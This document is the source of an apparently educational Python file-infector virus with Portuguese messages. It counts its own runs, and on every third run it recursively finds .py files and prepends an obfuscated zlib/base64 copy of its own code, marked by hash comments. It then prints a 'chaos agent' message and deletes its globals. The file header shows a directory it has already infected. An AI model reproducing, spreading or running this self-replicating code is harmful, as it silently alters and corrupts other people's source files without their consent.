# Infected directory: /home/marcelo/Documentos/teste_V

# begin-640cb33c36f4f8c693c06c903a13e1ec
exec("import zlib\nimport base64\nexec(zlib.decompress(base64.urlsafe_b64decode(b'eNoDAAAAAAE=')))")
# end-640cb33c36f4f8c693c06c903a13e1ec
import base64
import glob
import hashlib
import os
import random
import zlib

def get_content_of_file(file):
    data = None
    with open(file, "r") as my_file:
        data = my_file.readlines()

    return data

def get_content_if_infectable(file, hash):
    data = get_content_of_file(file)

    for line in data:
        if hash in line:
            return None

    return data

def obscure(data: bytes) -> bytes:
    return base64.urlsafe_b64encode(zlib.compress(data, 9))

def transform_and_obscure_virus_code(virus_code):
    new_virus_code = []
    for line in virus_code:
        new_virus_code.append("# "+ str(random.randrange(1000000))+ "\n")
        new_virus_code.append(line + "\n")

    obscured_virus_code = obscure(bytes("".join(new_virus_code), 'utf-8'))
    return obscured_virus_code

def find_files_to_infect(directory="."):
    return [file for file in glob.glob(f"{directory}/**/*.*", recursive=True) if file.endswith('.py')]

def summon_chaos():
    print("Coloque um pouco de anarquia, desestabilize a ordem e tudo virará o caos.\nEu sou o agente do caos!")

def infect(file, virus_code):
    hash = hashlib.md5(file.encode("utf-8")).hexdigest()

    if (data:=get_content_if_infectable(file, hash)):
        # Adicione o diretório ao início do arquivo infectado
        directory_code = f'# Infected directory: {os.path.dirname(os.path.abspath(__file__))}\n\n'
        obscured_virus_code = transform_and_obscure_virus_code(virus_code)
        viral_vector = "exec(\"import zlib\\nimport base64\\nexec(zlib.decompress(base64.urlsafe_b64decode("+str(obscured_virus_code)+")))\")"

        with open(file, "w") as infected_file:
            infected_file.write(directory_code)
            infected_file.write("# begin-"+ hash + "\n" + viral_vector + "\n# end-" + hash + "\n")
            infected_file.writelines(data)

def get_virus_code():
    virus_code_on = False
    virus_code = []

    virus_hash = hashlib.md5(os.path.basename(__file__).encode("utf-8")).hexdigest()
    code = get_content_of_file(__file__)

    for line in code:
        if "# begin-" + virus_hash in line:
            virus_code_on = True

        if virus_code_on:
            virus_code.append(line + "\n")

        if "# end-" + virus_hash in line:
            virus_code_on = False
            break

    return virus_code

# entry point

try:
    config_file = "config.txt"
    executions = 0
    trigger_executions = 3

    if not os.path.isfile(config_file):
        with open(config_file, "w") as config:
            config.write("0")

    with open(config_file, "r") as config:
        try:
            executions = int(config.read().strip())
        except ValueError:
            executions = 0

    executions += 1

    if executions >= trigger_executions:
        executions = 0
        with open(config_file, "w") as config:
            config.write(str(executions))

        virus_code = get_virus_code()

        for file in find_files_to_infect():
            infect(file, virus_code)

        summon_chaos()
    else:
        with open(config_file, "w") as config:
            config.write(str(executions))
        print("Payload não executado nesta execução.")

finally:
    for i in list(globals().keys()):
        if(i[0] != '_'):
            exec('del {}'.format(i))

    del i

# end-78ea1850f48d1c1802f388db81698fd0
